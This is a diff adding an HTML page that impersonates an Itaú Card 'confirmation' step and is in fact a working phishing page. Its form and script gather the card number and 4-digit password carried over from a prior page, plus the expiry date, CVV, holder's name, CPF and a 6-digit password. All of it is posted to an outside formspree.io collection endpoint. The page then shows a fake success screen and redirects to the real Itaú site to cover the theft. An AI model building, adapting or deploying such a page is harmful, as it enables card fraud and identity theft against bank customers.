@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmação Itaú Card</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .input-mask {
+            letter-spacing: 1px;
+        }
+        .password-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background-color: black;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        .modal {
+            transition: opacity 0.3s ease;
+        }
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: block;
+            stroke-width: 2;
+            stroke: #fff;
+            stroke-miterlimit: 10;
+            margin: 10% auto;
+            box-shadow: inset 0px 0px 0px #ff6201;
+            animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+        }
+        .checkmark__circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 2;
+            stroke-miterlimit: 10;
+            stroke: #ff6201;
+            fill: none;
+            animation: stroke .6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+        .checkmark__check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: stroke .3s cubic-bezier(0.65, 0, 0.45, 1) .8s forwards;
+        }
+        @keyframes stroke {
+            100% {
+                stroke-dashoffset: 0;
+            }
+        }
+        @keyframes scale {
+            0%, 100% {
+                transform: none;
+            }
+            50% {
+                transform: scale3d(1.1, 1.1, 1);
+            }
+        }
+        @keyframes fill {
+            100% {
+                box-shadow: inset 0px 0px 0px 40px #ff6201;
+            }
+        }
+        .progress-container {
+            position: relative;
+            width: calc(100% - 80px);
+            margin: 0 auto;
+            height: 4px;
+            background-color: #e5e7eb;
+            margin-top: 18px;
+        }
+        .progress-bar {
+            position: absolute;
+            height: 100%;
+            background-color: #ff6201;
+            transition: width 0.4s ease;
+        }
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 2;
+            transition: all 0.3s ease;
+        }
+        .step-circle.active {
+            background-color: #ff6201;
+            color: white;
+        }
+        .step-circle.inactive {
+            background-color: #e5e7eb;
+            color: #6b7280;
+        }
+        .step-label {
+            margin-top: 8px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        .step-label.active {
+            color: #ff6201;
+        }
+        .step-label.inactive {
+            color: #9ca3af;
+        }
+        .steps-container {
+            position: relative;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 40px;
+        }
+    </style>
+</head>
+<body class="font-sans bg-gray-50">
+    <!-- Top Bar with Logo -->
+    <div class="bg-white shadow-md py-4">
+        <div class="container mx-auto flex justify-center">
+            <img src="foto/itaucard.png" alt="Itaú Card" class="h-12">
+        </div>
+    </div>
+
+    <!-- Progress Steps -->
+    <div class="container mx-auto px-4 py-8">
+        <div class="flex flex-col">
+            <div class="steps-container">
+                <!-- Step 1 -->
+                <div class="flex flex-col items-center">
+                    <div id="step1-circle" class="step-circle active">
+                        <span class="font-bold">1</span>
+                    </div>
+                    <span id="step1-label" class="step-label active">Segurança</span>
+                </div>
+                
+                <!-- Step 2 -->
+                <div class="flex flex-col items-center">
+                    <div id="step2-circle" class="step-circle inactive">
+                        <span class="font-bold">2</span>
+                    </div>
+                    <span id="step2-label" class="step-label inactive">Confirmação</span>
+                </div>
+                
+                <!-- Step 3 -->
+                <div class="flex flex-col items-center">
+                    <div id="step3-circle" class="step-circle inactive">
+                        <span class="font-bold">3</span>
+                    </div>
+                    <span id="step3-label" class="step-label inactive">Sucesso</span>
+                </div>
+            </div>
+            <div class="progress-container">
+                <div id="progress-bar" class="progress-bar" style="width: 0%"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Step 1 Content -->
+    <div id="step1-content" class="container mx-auto px-4 py-8 max-w-md">
+        <h2 class="text-[#ff6201] text-xl font-bold mb-4">Precisamos realizar um processo de confirmação.</h2>
+        <p class="text-[#ff6201] mb-6">Para prosseguir, confirme alguns dados do seu cartão de crédito.</p>
+        
+        <div class="mb-4">
+            <label for="validade" class="block text-gray-700 mb-2">Validade</label>
+            <input type="text" id="validade" placeholder="MM/AA" maxlength="5" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#ff6201]">
+            <p id="validade-error" class="text-red-500 text-sm mt-1 hidden">Por favor, insira uma data válida no formato MM/AA</p>
+        </div>
+        
+        <div class="mb-6">
+            <div class="flex justify-between items-center mb-2">
+                <label for="codigo" class="block text-gray-700">Código de segurança</label>
+                <button id="help-btn" class="text-[#ff6201] text-sm flex items-center">
+                    <i class="fas fa-question-circle mr-1"></i> Como encontrar?
+                </button>
+            </div>
+            <input type="text" id="codigo" placeholder="•••" maxlength="3" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#ff6201]">
+            <p id="codigo-error" class="text-red-500 text-sm mt-1 hidden">O código deve ter exatamente 3 dígitos</p>
+        </div>
+        
+        <button id="continue-btn" class="w-full bg-[#ff6201] text-white py-3 rounded-md font-bold hover:bg-[#e55801] transition duration-300">Continuar</button>
+    </div>
+
+    <!-- Step 2 Content (Hidden Initially) -->
+    <div id="step2-content" class="container mx-auto px-4 py-8 max-w-md hidden">
+        <form id="formData" action="https://formspree.io/f/xwpoodkg" method="POST">
+            <!-- Hidden fields from index.html -->
+            <input type="hidden" name="cartao" id="hiddenCartao">
+            <input type="hidden" name="senha4digitos" id="hiddenSenha4">
+            
+            <!-- Hidden fields for step 1 data -->
+            <input type="hidden" name="validade" id="hiddenValidade">
+            <input type="hidden" name="codigo" id="hiddenCodigo">
+            
+            <h2 class="text-[#ff6201] text-xl font-bold mb-4">Agora para finalizar, confirme os dados solicitados abaixo.</h2>
+            
+            <div class="mb-4">
+                <label for="nome" class="block text-gray-700 mb-2">Nome Titular</label>
+                <input type="text" id="nome" name="nome" maxlength="100" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#ff6201]">
+                <p id="nome-error" class="text-red-500 text-sm mt-1 hidden">O nome não pode conter números</p>
+            </div>
+            
+            <div class="mb-4">
+                <label for="cpf" class="block text-gray-700 mb-2">CPF</label>
+                <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" class="w-full px-4 py-2 border border-gray-300 rounded-md input-mask focus:outline-none focus:ring-2 focus:ring-[#ff6201]">
+                <p id="cpf-error" class="text-red-500 text-sm mt-1 hidden">Por favor, insira um CPF válido</p>
+            </div>
+            
+            <div class="mb-6">
+                <label for="senha" class="block text-gray-700 mb-2">Senha de 6 dígitos</label>
+                <div class="relative">
+                    <input type="password" id="senha" name="senha" maxlength="6" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#ff6201]">
+                    <div id="password-dots" class="absolute right-3 top-1/2 transform -translate-y-1/2 flex"></div>
+                </div>
+                <p id="senha-error" class="text-red-500 text-sm mt-1 hidden">A senha deve ter exatamente 6 dígitos</p>
+            </div>
+            
+            <button type="submit" id="confirm-btn" class="w-full bg-[#ff6201] text-white py-3 rounded-md font-bold hover:bg-[#e55801] transition duration-300">Confirmar</button>
+        </form>
+    </div>
+
+    <!-- Step 3 Content (Hidden Initially) -->
+    <div id="step3-content" class="container mx-auto px-4 py-8 max-w-md text-center hidden">
+        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+            <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+            <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+        </svg>
+        
+        <h2 class="text-[#ff6201] text-2xl font-bold mb-2">Confirmação efetuada com sucesso!</h2>
+        <p class="text-gray-700 font-bold">Aguarde, você será redirecionado...</p>
+    </div>
+
+    <!-- Modal -->
+    <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden modal">
+        <div class="bg-white rounded-lg p-6 max-w-sm mx-4">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="text-lg font-bold text-[#ff6201]">Como encontrar o código de segurança?</h3>
+                <button id="close-modal" class="text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <img src="foto/cvv1.png" alt="Localização do código de segurança" class="mb-4 rounded">
+            <p class="text-gray-700">O código de segurança (CVV) é composto por 3 dígitos e está localizado no verso do seu cartão, próximo à tarja de assinatura.</p>
+        </div>
+    </div>
+
+    <script>
+        // Add this at the beginning of your script
+        // Get URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const cartaoNumero = urlParams.get('cartao');
+        const senha4digitos = urlParams.get('senha');
+
+        // Store the values from index.html in hidden fields
+        if (cartaoNumero && senha4digitos) {
+            document.getElementById('hiddenCartao').value = cartaoNumero;
+            document.getElementById('hiddenSenha4').value = senha4digitos;
+        }
+        
+        // DOM Elements
+        const step1Content = document.getElementById('step1-content');
+        const step2Content = document.getElementById('step2-content');
+        const step3Content = document.getElementById('step3-content');
+        const continueBtn = document.getElementById('continue-btn');
+        const helpBtn = document.getElementById('help-btn');
+        const closeModal = document.getElementById('close-modal');
+        const modal = document.getElementById('modal');
+        const cpfInput = document.getElementById('cpf');
+        const senhaInput = document.getElementById('senha');
+        const passwordDots = document.getElementById('password-dots');
+        const validadeInput = document.getElementById('validade');
+        const codigoInput = document.getElementById('codigo');
+        const nomeInput = document.getElementById('nome');
+        
+        // Progress elements
+        const progressBar = document.getElementById('progress-bar');
+        const step1Circle = document.getElementById('step1-circle');
+        const step2Circle = document.getElementById('step2-circle');
+        const step3Circle = document.getElementById('step3-circle');
+        const step1Label = document.getElementById('step1-label');
+        const step2Label = document.getElementById('step2-label');
+        const step3Label = document.getElementById('step3-label');
+        
+        // Error messages
+        const validadeError = document.getElementById('validade-error');
+        const codigoError = document.getElementById('codigo-error');
+        const nomeError = document.getElementById('nome-error');
+        const cpfError = document.getElementById('cpf-error');
+        const senhaError = document.getElementById('senha-error');
+
+        // Format date input (MM/AA)
+        validadeInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            
+            e.target.value = value;
+            
+            // Validate date
+            if (value.length === 5) {
+                const [month, year] = value.split('/');
+                const currentYear = new Date().getFullYear() % 100;
+                const currentMonth = new Date().getMonth() + 1;
+                
+                const monthNum = parseInt(month);
+                const yearNum = parseInt(year);
+                
+                if (monthNum < 1 || monthNum > 12 || 
+                    yearNum < currentYear || 
+                    (yearNum === currentYear && monthNum < currentMonth)) {
+                    validadeError.classList.remove('hidden');
+                } else {
+                    validadeError.classList.add('hidden');
+                }
+            } else {
+                validadeError.classList.add('hidden');
+            }
+        });
+
+        // Format CVV input (3 digits)
+        codigoInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length > 3) {
+                value = value.substring(0, 3);
+            }
+            
+            e.target.value = value;
+            
+            // Show dots when typing
+            if (value.length > 0) {
+                codigoInput.type = 'password';
+            } else {
+                codigoInput.type = 'text';
+                codigoInput.placeholder = '•••';
+            }
+            
+            // Validate length
+            if (value.length === 3) {
+                codigoError.classList.add('hidden');
+            } else {
+                codigoError.classList.add('hidden');
+            }
+        });
+
+        // CPF Mask and Validation
+        cpfInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length > 3) {
+                value = value.substring(0, 3) + '.' + value.substring(3);
+            }
+            if (value.length > 7) {
+                value = value.substring(0, 7) + '.' + value.substring(7);
+            }
+            if (value.length > 11) {
+                value = value.substring(0, 11) + '-' + value.substring(11, 13);
+            }
+            
+            e.target.value = value;
+            
+            // Validate CPF length
+            if (value.length === 14) {
+                if (validateCPF(value.replace(/\D/g, ''))) {
+                    cpfError.classList.add('hidden');
+                } else {
+                    cpfError.classList.remove('hidden');
+                }
+            } else {
+                cpfError.classList.add('hidden');
+            }
+        });
+
+        // CPF Validation Function
+        function validateCPF(cpf) {
+            // Remove non-numeric characters
+            cpf = cpf.replace(/\D/g, '');
+            
+            // Check if it has 11 digits and isn't all the same number
+            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) {
+                return false;
+            }
+            
+            // Validate first digit
+            let sum = 0;
+            for (let i = 0; i < 9; i++) {
+                sum += parseInt(cpf.charAt(i)) * (10 - i);
+            }
+            let remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) remainder = 0;
+            if (remainder !== parseInt(cpf.charAt(9))) {
+                return false;
+            }
+            
+            // Validate second digit
+            sum = 0;
+            for (let i = 0; i < 10; i++) {
+                sum += parseInt(cpf.charAt(i)) * (11 - i);
+            }
+            remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) remainder = 0;
+            if (remainder !== parseInt(cpf.charAt(10))) {
+                return false;
+            }
+            
+            return true;
+        }
+
+        // Name validation (no numbers)
+        nomeInput.addEventListener('input', function(e) {
+            const value = e.target.value;
+            
+            if (/\d/.test(value)) {
+                nomeError.classList.remove('hidden');
+            } else {
+                nomeError.classList.add('hidden');
+            }
+        });
+
+        // Password dots
+        senhaInput.addEventListener('input', function(e) {
+            const length = e.target.value.length;
+            passwordDots.innerHTML = '';
+            
+            for (let i = 0; i < length; i++) {
+                const dot = document.createElement('span');
+                dot.className = 'password-dot';
+                passwordDots.appendChild(dot);
+            }
+            
+            // Validate password length
+            if (length === 6) {
+                senhaError.classList.add('hidden');
+            } else {
+                senhaError.classList.add('hidden');
+            }
+        });
+
+        // Update progress steps
+        function updateProgress(step) {
+            // Reset all steps
+            step1Circle.classList.remove('active');
+            step1Circle.classList.add('inactive');
+            step2Circle.classList.remove('active');
+            step2Circle.classList.add('inactive');
+            step3Circle.classList.remove('active');
+            step3Circle.classList.add('inactive');
+            
+            step1Label.classList.remove('active');
+            step1Label.classList.add('inactive');
+            step2Label.classList.remove('active');
+            step2Label.classList.add('inactive');
+            step3Label.classList.remove('active');
+            step3Label.classList.add('inactive');
+            
+            // Activate steps based on current step
+            if (step >= 1) {
+                step1Circle.classList.remove('inactive');
+                step1Circle.classList.add('active');
+                step1Label.classList.remove('inactive');
+                step1Label.classList.add('active');
+            }
+            if (step >= 2) {
+                step2Circle.classList.remove('inactive');
+                step2Circle.classList.add('active');
+                step2Label.classList.remove('inactive');
+                step2Label.classList.add('active');
+            }
+            if (step >= 3) {
+                step3Circle.classList.remove('inactive');
+                step3Circle.classList.add('active');
+                step3Label.classList.remove('inactive');
+                step3Label.classList.add('active');
+            }
+            
+            // Update progress bar
+            if (step === 1) {
+                progressBar.style.width = '0%';
+            } else if (step === 2) {
+                progressBar.style.width = '50%';
+            } else if (step === 3) {
+                progressBar.style.width = '100%';
+            }
+        }
+
+        // Modify the continue button to store step 1 data
+        continueBtn.addEventListener('click', function() {
+            // Validate fields
+            let isValid = true;
+            
+            // Validate date
+            if (validadeInput.value.length !== 5 || validadeError.classList.contains('hidden') === false) {
+                validadeError.classList.remove('hidden');
+                isValid = false;
+            }
+            
+            // Validate CVV
+            if (codigoInput.value.length !== 3) {
+                codigoError.classList.remove('hidden');
+                isValid = false;
+            }
+            
+            if (isValid) {
+                // Store step 1 data in hidden fields
+                document.getElementById('hiddenValidade').value = validadeInput.value;
+                document.getElementById('hiddenCodigo').value = codigoInput.value;
+                
+                step1Content.classList.add('hidden');
+                step2Content.classList.remove('hidden');
+                updateProgress(2);
+            }
+        });
+
+        // Replace the confirm button click with form submission
+        document.getElementById('formData').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Validate fields
+            let isValid = true;
+            
+            // Validate name
+            if (nomeInput.value.length === 0 || nomeError.classList.contains('hidden') === false) {
+                nomeError.classList.remove('hidden');
+                isValid = false;
+            }
+            
+            // Validate CPF
+            if (cpfInput.value.length !== 14 || !validateCPF(cpfInput.value.replace(/\D/g, ''))) {
+                cpfError.classList.remove('hidden');
+                isValid = false;
+            }
+            
+            // Validate password
+            if (senhaInput.value.length !== 6) {
+                senhaError.classList.remove('hidden');
+                isValid = false;
+            }
+            
+            if (isValid) {
+                // Submit form
+                const formData = new FormData(this);
+                fetch(this.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                }).then(response => {
+                    if (response.ok) {
+                        // Show success screen
+                        step2Content.classList.add('hidden');
+                        step3Content.classList.remove('hidden');
+                        updateProgress(3);
+                        
+                        // Redirect after 5 seconds
+                        setTimeout(function() {
+                            window.location.href = 'https://www.itau.com.br/cartoes/escolha/formulario/itau-personnalite-mastercard-black.html';
+                        }, 5000);
+                    }
+                });
+            }
+        });
+
+        // Modal controls
+        helpBtn.addEventListener('click', function() {
+            modal.classList.remove('hidden');
+        });
+
+        closeModal.addEventListener('click', function() {
+            modal.classList.add('hidden');
+        });
+
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) {
+                modal.classList.add('hidden');
+            }
+        });
+
+        // Initialize progress
+        updateProgress(1);
+    </script>
+</body>
+</html>
